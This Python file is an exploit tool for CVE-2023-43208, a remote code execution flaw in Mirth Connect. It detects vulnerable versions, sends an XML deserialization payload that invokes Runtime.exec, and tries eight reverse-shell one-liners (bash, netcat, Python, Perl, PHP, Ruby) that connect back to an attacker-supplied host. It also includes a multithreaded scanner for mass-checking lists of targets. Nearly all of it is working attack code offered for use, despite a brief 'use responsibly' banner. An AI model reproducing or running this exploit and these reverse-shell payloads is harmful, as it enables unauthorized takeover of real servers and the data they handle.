import os
import time
import socket
import argparse
import requests
import threading
import sys

from packaging import version
from rich.console import Console
from alive_progress import alive_bar
from concurrent.futures import ThreadPoolExecutor, as_completed

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)


class MirthConnectExploit:
    def __init__(self):
        self.console = Console()
        self.execution_process = "/api/users"
        self.grab_version = "/api/server/version"
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.0; rv:109.0) Gecko/20100101 Firefox/118.0",
            "X-Requested-With": "OpenAPI",
            "Content-Type": "application/xml",
        }
        self.output_file = None
        self.lhost = None
        self.lport = None
        self.target = None

    def custom_print(self, message: str, header: str) -> None:
        header_colors = {"+": "green", "-": "red", "!": "yellow", "*": "blue"}
        self.console.print(
            f"[bold {header_colors.get(header, 'white')}][{header}][/bold {header_colors.get(header, 'white')}] {message}"
        )

    def ascii_art(self):
        art_texts = [
            " :::===== :::  === :::=====      :::====  :::====  :::====  :::===           :::  === :::===  :::====  :::====  :::==== ",
            " :::      :::  === :::           ::   === :::  === ::   ===     ===          :::  ===     === ::   === :::  === :::  ===",
            " ===      ===  === ======           ====  ===  ===    ====   =====  ======== ========  =====     ====  ===  ===  ====== ",
            " ===       ======  ===            ===     ===  ===  ===         ===               ===     ===  ===     ===  === ===  ===",
            "  =======    ==    ========      ========  ======  ======== ======                === ======  ========  ======   ====== ",
        ]
        print()
        for text in art_texts:
            self.custom_print(f"[bold bright_red]{text}[/bold bright_red]", "*")
        print()
        self.custom_print("[bold bright_yellow]CVE-2023-43208 - Mirth Connect RCE Exploit[/bold bright_yellow]", "!")
        self.custom_print("[bold bright_cyan]Original Author: K3ysTr0K3R & Chocapikk[/bold bright_cyan]", "+")
        self.custom_print("[bold bright_magenta]Modified by: M0h4[/bold bright_magenta]", "+")
        self.custom_print("[bold bright_white]Repository: CVE-2023-43208-EXPLOIT[/bold bright_white]", "*")
        print()
        self.custom_print("[bold bright_green]Use responsibly and only on authorized systems![/bold bright_green]", "*")
        print()

    def get_user_input(self):
        """Get target, LHOST and LPORT from user interactively"""
        print("\n" + "="*60)
        self.custom_print("[bold bright_white]M0h4's Mirth Connect Exploit[/bold bright_white]", "!")
        print("="*60)
        
        # Get target URL
        while not self.target:
            self.target = input("\n[?] Enter target URL (e.g., https://192.168.1.100:8443): ").strip()
            if not self.target:
                print("[-] Target URL cannot be empty!")
        
        # Get LHOST
        while not self.lhost:
            self.lhost = input("[?] Enter your LHOST (listening IP): ").strip()
            if not self.lhost:
                print("[-] LHOST cannot be empty!")
        
        # Get LPORT
        while not self.lport:
            try:
                self.lport = int(input("[?] Enter your LPORT (listening port): ").strip())
                if self.lport < 1 or self.lport > 65535:
                    print("[-] Port must be between 1 and 65535!")
                    self.lport = None
            except ValueError:
                print("[-] Please enter a valid port number!")
                self.lport = None
        
        print("\n" + "="*60)
        self.custom_print(f"[bold green]Target: {self.target}[/bold green]", "+")
        self.custom_print(f"[bold green]LHOST: {self.lhost}[/bold green]", "+")
        self.custom_print(f"[bold green]LPORT: {self.lport}[/bold green]", "+")
        print("="*60 + "\n")
        
        # Confirm
        confirm = input("[?] Start exploitation? (y/n): ").strip().lower()
        if confirm != 'y':
            self.custom_print("Exploit cancelled by user", "!")
            sys.exit(0)

    def detect_mirth_connect(self, target):
        self.custom_print("Looking for Mirth Connect instance...", "*")
        try:
            response = requests.get(target, timeout=10, verify=False)
            if "Mirth Connect Administrator" in response.text:
                self.custom_print("Found Mirth Connect instance", "+")
                return True
            else:
                self.custom_print("Mirth Connect not found", "-")
        except requests.exceptions.RequestException as e:
            self.custom_print(f"Error while trying to connect to {target}: {e}", "-")
        return False

    def is_vulnerable_version(self, version_str):
        try:
            parsed_version = version.parse(version_str.strip())
            if isinstance(parsed_version, version.Version):
                fixed_version = version.parse("4.4.1")
                if parsed_version < fixed_version:
                    return version_str.strip()
        except:
            return None
        return None

    def detect_vuln(self, target):
        if self.detect_mirth_connect(target):
            try:
                response = requests.get(
                    target + self.grab_version,
                    headers=self.headers,
                    timeout=10,
                    verify=False,
                )
                version_info = response.text.strip()
                vuln_version = self.is_vulnerable_version(version_info)
                if vuln_version:
                    self.custom_print(
                        f"Vulnerable Mirth Connect version {vuln_version} found at {target}",
                        "+",
                    )
                    return True
                else:
                    self.custom_print(f"Target is running version {version_info} which is NOT vulnerable", "-")
            except requests.exceptions.RequestException as e:
                self.custom_print(
                    f"Error fetching version information from {target}: {e}", "-"
                )
        return False

    @staticmethod
    def build_xml_payload(command):
        # XML escape the command
        command = command.replace("&", "&amp;")
        command = command.replace("<", "&lt;")
        command = command.replace(">", "&gt;")
        command = command.replace('"', "&quot;")
        command = command.replace("'", "&apos;")

        xml_data = f"""
        <sorted-set>
            <string>M0h4_was_here</string>
            <dynamic-proxy>
                <interface>java.lang.Comparable</interface>
                <handler class="org.apache.commons.lang3.event.EventUtils$EventBindingInvocationHandler">
                    <target class="org.apache.commons.collections4.functors.ChainedTransformer">
                        <iTransformers>
                            <org.apache.commons.collections4.functors.ConstantTransformer>
                                <iConstant class="java-class">java.lang.Runtime</iConstant>
                            </org.apache.commons.collections4.functors.ConstantTransformer>
                            <org.apache.commons.collections4.functors.InvokerTransformer>
                                <iMethodName>getMethod</iMethodName>
                                <iParamTypes>
                                    <java-class>java.lang.String</java-class>
                                    <java-class>[Ljava.lang.Class;</java-class>
                                </iParamTypes>
                                <iArgs>
                                    <string>getRuntime</string>
                                    <java-class-array/>
                                </iArgs>
                            </org.apache.commons.collections4.functors.InvokerTransformer>
                            <org.apache.commons.collections4.functors.InvokerTransformer>
                                <iMethodName>invoke</iMethodName>
                                <iParamTypes>
                                    <java-class>java.lang.Object</java-class>
                                    <java-class>[Ljava.lang.Object;</java-class>
                                </iParamTypes>
                                <iArgs>
                                    <null/>
                                    <object-array/>
                                </iArgs>
                            </org.apache.commons.collections4.functors.InvokerTransformer>
                            <org.apache.commons.collections4.functors.InvokerTransformer>
                                <iMethodName>exec</iMethodName>
                                <iParamTypes>
                                    <java-class>java.lang.String</java-class>
                                </iParamTypes>
                                <iArgs>
                                    <string>{command}</string>
                                </iArgs>
                            </org.apache.commons.collections4.functors.InvokerTransformer>
                        </iTransformers>
                    </target>
                    <methodName>transform</methodName>
                    <eventTypes>
                        <string>compareTo</string>
                    </eventTypes>
                </handler>
            </dynamic-proxy>
        </sorted-set>
        """
        return xml_data

    def exploit(self, target, lhost, lport):
        print("\n" + "="*60)
        self.custom_print("[bold bright_white]M0h4's Exploitation Engine Starting...[/bold bright_white]", "!")
        print("="*60 + "\n")
        
        if self.detect_vuln(target):
            # Multiple reverse shell payloads
            payloads = [
                # Bash reverse shell
                f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
                # Netcat reverse shell
                f"nc -e /bin/sh {lhost} {lport}",
                # Python reverse shell
                f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
                # Perl reverse shell
                f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
                # Alternative bash reverse shell
                f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
                # Your original command
                f"0<&53-;exec 53<>/dev/tcp/{lhost}/{lport};sh <&53 >&53 2>&53",
                # PHP reverse shell (if PHP is installed)
                f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                # Ruby reverse shell
                f"ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"{lhost}\",{lport}))'"
            ]
            
            self.custom_print(f"Target: [bold cyan]{target}[/bold cyan]", "+")
            self.custom_print(f"LHOST: [bold cyan]{lhost}[/bold cyan]", "+")
            self.custom_print(f"LPORT: [bold cyan]{lport}[/bold cyan]", "+")
            print()
            self.custom_print("Make sure your listener is running:", "!")
            self.custom_print(f"  ncat -lnvp {lport}", "!")
            self.custom_print(f"  OR", "!")
            self.custom_print(f"  nc -lnvp {lport}", "!")
            print()
            
            input("[?] Press Enter when your listener is ready...")
            
            self.custom_print(f"Launching M0h4's exploit against {target}...", "*")
            print()
            
            success = False
            for i, cmd in enumerate(payloads, 1):
                self.custom_print(f"[M0h4] Trying payload {i}/{len(payloads)}...", "*")
                self.custom_print(f"Command: {cmd[:60]}...", "!")
                
                xml_data = self.build_xml_payload(cmd)
                
                try:
                    response = requests.post(
                        target + self.execution_process,
                        headers=self.headers,
                        data=xml_data,
                        timeout=10,
                        verify=False,
                    )
                    
                    # Check response
                    if response.status_code == 200:
                        self.custom_print(f"Payload {i} sent successfully - Check your listener!", "+")
                        success = True
                    elif response.status_code == 500:
                        self.custom_print(f"Payload {i} triggered error (this is often good!)", "!")
                        success = True
                    else:
                        self.custom_print(f"Payload {i} returned status code: {response.status_code}", "-")
                    
                except requests.exceptions.RequestException as e:
                    if "Connection aborted" in str(e) or "Remote end closed connection" in str(e):
                        self.custom_print(f"Payload {i} likely succeeded! Connection closed.", "+")
                        success = True
                    else:
                        self.custom_print(f"Request failed for payload {i}: {e}", "-")
                
                time.sleep(2)  # Wait between payloads
                
                if success:
                    choice = input("\n[?] Did you get a shell? (y/n): ").strip().lower()
                    if choice == 'y':
                        self.custom_print("[bold green]Shell acquired! M0h4 strikes again![/bold green]", "+")
                        break
                    else:
                        self.custom_print("Continuing with next payload...", "*")
                        success = False
                        print()
            
            if not success:
                self.custom_print("[bold red]All payloads sent but no shell received. Try different payloads manually.[/bold red]", "-")
                self.custom_print("Check if the target is vulnerable and your listener is correctly configured.", "!")
        else:
            self.custom_print(f"Target {target} is not vulnerable or not accessible", "-")

    def run(self):
        parser = argparse.ArgumentParser(
            description="M0h4's Mirth Connect RCE Exploit (CVE-2023-43208) - Modified from K3ysTr0K3R"
        )
        parser.add_argument("-u", "--url", help="Target URL to exploit")
        parser.add_argument("-lh", "--lhost", help="Listening host")
        parser.add_argument("-lp", "--lport", help="Listening port")
        parser.add_argument("-f", "--file", help="File containing target URLs to scan")
        parser.add_argument("-o", "--output", help="Output file for saving scan results")
        parser.add_argument("-t", "--threads", default=50, type=int, help="Number of threads to use for scanning")
        parser.add_argument("--no-interactive", action="store_true", help="Run in non-interactive mode (requires all args)")
        
        args = parser.parse_args()
        
        self.output_file = args.output
        
        # If not in non-interactive mode and missing required args, use interactive prompts
        if not args.no_interactive and not (args.url and args.lhost and args.lport) and not args.file:
            self.get_user_input()
            self.exploit(self.target, self.lhost, self.lport)
        elif args.url and args.lhost and args.lport:
            self.exploit(args.url, args.lhost, args.lport)
        elif args.file:
            self.scan_from_file(args.file, args.threads)
        else:
            parser.print_help()

    def scanner(self, target):
        try:
            response = requests.get(
                target + self.grab_version,
                headers=self.headers,
                timeout=10,
                verify=False,
            )
            vuln_version = self.is_vulnerable_version(response.text.strip())
            if vuln_version:
                self.custom_print(
                    f"[M0h4] Vulnerability Detected | [bold bright_yellow]{target:<60}[/bold bright_yellow] | Version: [bold cyan]{vuln_version:<15}[/bold cyan]",
                    "+",
                )
                if self.output_file:
                    with open(self.output_file, "a") as file:
                        file.write(target + "\n")
        except requests.exceptions.RequestException:
            pass

    def scan_from_file(self, target_file, threads):
        if not os.path.exists(target_file):
            self.custom_print(f"File not found: {target_file}", "-")
            return

        self.custom_print(f"[M0h4] Scanning targets from {target_file}...", "*")
        
        with open(target_file, "r") as url_file:
            urls = [url.strip() for url in url_file.readlines()]
            if not urls:
                return

            with alive_bar(
                len(urls), title="M0h4 Scanning", bar="smooth", enrich_print=False
            ) as bar:
                with ThreadPoolExecutor(max_workers=threads) as executor:
                    futures = [executor.submit(self.scanner, url) for url in urls]
                    for future in as_completed(futures):
                        bar()


if __name__ == "__main__":
    exploit_tool = MirthConnectExploit()
    exploit_tool.ascii_art()
    
    try:
        exploit_tool.run()
    except KeyboardInterrupt:
        print("\n")
        exploit_tool.custom_print("[bold yellow]Exploit interrupted by user[/bold yellow]", "!")
        exploit_tool.custom_print("[bold cyan]M0h4 out![/bold cyan]", "*")
        sys.exit(0)